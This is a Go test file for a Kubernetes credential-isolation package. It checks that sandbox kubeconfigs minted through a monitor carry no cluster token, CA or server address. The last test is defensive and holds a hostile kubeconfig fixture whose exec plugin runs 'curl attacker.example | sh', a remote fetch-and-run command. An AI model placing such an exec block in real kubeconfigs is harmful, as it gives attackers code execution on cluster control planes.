package kubeguard

// kubeconfig_test.go asserts the property the whole package is arranged
// around: what the sandbox receives is not a cluster credential.
//
// Every test here uses a known plaintext, so the assertions are "this exact
// string does not appear in these exact bytes" rather than a structural check
// that could pass while the secret rode along in a field nobody looked at.

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"math/big"
	"strings"
	"testing"
	"time"

	"gopkg.in/yaml.v3"
)

// Known plaintexts. Distinct and unlikely, so a substring search for them is
// meaningful.
const (
	testClusterToken  = "REAL-CLUSTER-BEARER-TOKEN-8f3a1c"
	testClusterServer = "https://kube.internal.example:6443"
)

// testClusterCA is a real, parseable certificate, because ParseKubeconfig
// verifies that certificate-authority-data is a PEM bundle rather than
// carrying it as opaque bytes — so a placeholder string would test the
// rejection path instead of the delivery path.
var testClusterCA = mustSelfSignedCAB64()

func mustSelfSignedCAB64() string {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		panic(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "cloop-kubeguard-test-ca"},
		NotBefore:             time.Unix(0, 0),
		NotAfter:              time.Unix(1<<31-1, 0),
		IsCA:                  true,
		BasicConstraintsValid: true,
		KeyUsage:              x509.KeyUsageCertSign,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}
	return base64.StdEncoding.EncodeToString(
		pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}))
}

// testKubeconfig renders a kubeconfig carrying the known plaintexts above.
func testKubeconfig(server string) []byte {
	if server == "" {
		server = testClusterServer
	}
	return []byte(`apiVersion: v1
kind: Config
current-context: prod
clusters:
- name: prod-cluster
  cluster:
    server: ` + server + `
    certificate-authority-data: ` + testClusterCA + `
contexts:
- name: prod
  context:
    cluster: prod-cluster
    user: prod-admin
    namespace: app
users:
- name: prod-admin
  user:
    token: ` + testClusterToken + `
`)
}

// testInsecureKubeconfig points at a test server whose certificate is not
// trusted, which is what httptest.NewTLSServer produces.
func testInsecureKubeconfig(server string) []byte {
	return []byte(`apiVersion: v1
kind: Config
current-context: prod
clusters:
- name: prod-cluster
  cluster:
    server: ` + server + `
    insecure-skip-tls-verify: true
contexts:
- name: prod
  context:
    cluster: prod-cluster
    user: prod-admin
    namespace: app
users:
- name: prod-admin
  user:
    token: ` + testClusterToken + `
`)
}

func newTestRegistry(t *testing.T) *Registry {
	t.Helper()
	reg, err := NewRegistry("https://hub.example:8444")
	if err != nil {
		t.Fatalf("NewRegistry: %v", err)
	}
	return reg
}

// TestDeliveredKubeconfigCarriesNoClusterCredential is the assertion the
// package exists to be able to make.
func TestDeliveredKubeconfigCarriesNoClusterCredential(t *testing.T) {
	reg := newTestRegistry(t)
	m, err := reg.Mint(MintRequest{Kubeconfig: testKubeconfig("")})
	if err != nil {
		t.Fatalf("Mint: %v", err)
	}

	doc := string(m.Kubeconfig)
	for _, secret := range []struct{ name, value string }{
		{"the cluster bearer token", testClusterToken},
		{"the cluster CA", testClusterCA},
		// The address is withheld too, which is what makes the monitor
		// unavoidable rather than merely convenient: a sandbox holding this
		// document does not know where the API server is.
		{"the API server address", testClusterServer},
		{"the upstream cluster name", "prod-cluster"},
		{"the upstream user name", "prod-admin"},
	} {
		if strings.Contains(doc, secret.value) {
			t.Errorf("the delivered kubeconfig contains %s (%q):\n%s", secret.name, secret.value, doc)
		}
	}

	// What it does contain: the monitor's address and a token that is not the
	// cluster's.
	if !strings.Contains(doc, reg.BaseURL) {
		t.Errorf("the delivered kubeconfig does not point at the monitor (%s):\n%s", reg.BaseURL, doc)
	}
	if !strings.Contains(doc, m.Token) {
		t.Error("the delivered kubeconfig does not carry the session token")
	}
	if m.Token == testClusterToken {
		t.Fatal("the session token is the cluster token")
	}
}

// TestDeliveredKubeconfigParsesAsAKubeconfig checks the document is one
// kubectl would accept, structurally: one cluster, one user, one context, and
// a current-context naming it.
func TestDeliveredKubeconfigParsesAsAKubeconfig(t *testing.T) {
	reg := newTestRegistry(t)
	reg.CABundle = []byte("-----BEGIN CERTIFICATE-----\nMONITORCA\n-----END CERTIFICATE-----\n")
	m, err := reg.Mint(MintRequest{Kubeconfig: testKubeconfig("")})
	if err != nil {
		t.Fatalf("Mint: %v", err)
	}

	var doc struct {
		APIVersion     string `yaml:"apiVersion"`
		Kind           string `yaml:"kind"`
		CurrentContext string `yaml:"current-context"`
		Clusters       []struct {
			Name    string `yaml:"name"`
			Cluster struct {
				Server string `yaml:"server"`
				CAData string `yaml:"certificate-authority-data"`
			} `yaml:"cluster"`
		} `yaml:"clusters"`
		Contexts []struct {
			Name    string `yaml:"name"`
			Context struct {
				Cluster   string `yaml:"cluster"`
				User      string `yaml:"user"`
				Namespace string `yaml:"namespace"`
			} `yaml:"context"`
		} `yaml:"contexts"`
		Users []struct {
			Name string `yaml:"name"`
			User struct {
				Token string `yaml:"token"`
			} `yaml:"user"`
		} `yaml:"users"`
	}
	if err := yaml.Unmarshal(m.Kubeconfig, &doc); err != nil {
		t.Fatalf("the delivered kubeconfig is not valid YAML: %v\n%s", err, m.Kubeconfig)
	}
	switch {
	case doc.APIVersion != "v1" || doc.Kind != "Config":
		t.Errorf("apiVersion/kind = %q/%q, want v1/Config", doc.APIVersion, doc.Kind)
	case len(doc.Clusters) != 1 || len(doc.Users) != 1 || len(doc.Contexts) != 1:
		t.Fatalf("want exactly one cluster, user and context; got %d/%d/%d",
			len(doc.Clusters), len(doc.Users), len(doc.Contexts))
	case doc.CurrentContext != doc.Contexts[0].Name:
		t.Errorf("current-context %q names no context", doc.CurrentContext)
	case doc.Clusters[0].Cluster.Server != reg.BaseURL:
		t.Errorf("server = %q, want %q", doc.Clusters[0].Cluster.Server, reg.BaseURL)
	case doc.Users[0].User.Token != m.Token:
		t.Error("the user's token is not the session token")
	case doc.Clusters[0].Cluster.CAData == "":
		t.Error("the CA bundle was not embedded, so the sandbox cannot verify the monitor")
	}
	// The upstream context's namespace carries through as a convenience.
	if got := doc.Contexts[0].Context.Namespace; got != "app" {
		t.Errorf("default namespace = %q, want app", got)
	}
}

// TestDeliveredContextDoesNotDefaultToADeniedNamespace: a context pointing at
// a namespace every request would be refused for is a worse first experience
// than no default at all.
func TestDeliveredContextDoesNotDefaultToADeniedNamespace(t *testing.T) {
	reg := newTestRegistry(t)
	// The upstream context says "app"; the policy allows only "team-b".
	m, err := reg.Mint(MintRequest{
		Kubeconfig: testKubeconfig(""),
		Policy:     Policy{Namespaces: []string{"team-b"}},
	})
	if err != nil {
		t.Fatalf("Mint: %v", err)
	}
	doc := string(m.Kubeconfig)
	if strings.Contains(doc, "namespace: app\n") {
		t.Errorf("the delivered context defaults to a namespace the policy denies:\n%s", doc)
	}
	if !strings.Contains(doc, "namespace: team-b") {
		t.Errorf("the delivered context does not default to the allowed namespace:\n%s", doc)
	}
}

func TestFirstConcreteNamespaceSkipsGlobs(t *testing.T) {
	tests := []struct {
		in   []string
		want string
	}{
		{nil, ""},
		{[]string{"app"}, "app"},
		{[]string{"app-*", "app-one"}, "app-one"},
		{[]string{"*"}, ""},
		{[]string{"team-?"}, ""},
	}
	for _, tc := range tests {
		if got := firstConcreteNamespace(tc.in); got != tc.want {
			t.Errorf("firstConcreteNamespace(%v) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestMintRejectsAKubeconfigThatWouldRunCodeOnTheHub confirms the hardened
// parser is the one in the path. An `exec` block names a binary client-go
// would run on the control plane, as the control-plane user, and a
// tenant-supplied kubeconfig is exactly where one would arrive.
func TestMintRejectsAKubeconfigThatWouldRunCodeOnTheHub(t *testing.T) {
	reg := newTestRegistry(t)
	hostile := []byte(`apiVersion: v1
kind: Config
current-context: prod
clusters:
- name: c
  cluster:
    server: https://kube.internal.example:6443
contexts:
- name: prod
  context: {cluster: c, user: u}
users:
- name: u
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: /bin/sh
      args: ["-c", "curl attacker.example | sh"]
`)
	if _, err := reg.Mint(MintRequest{Kubeconfig: hostile}); err == nil {
		t.Fatal("a kubeconfig with an exec credential plugin was accepted")
	}
}
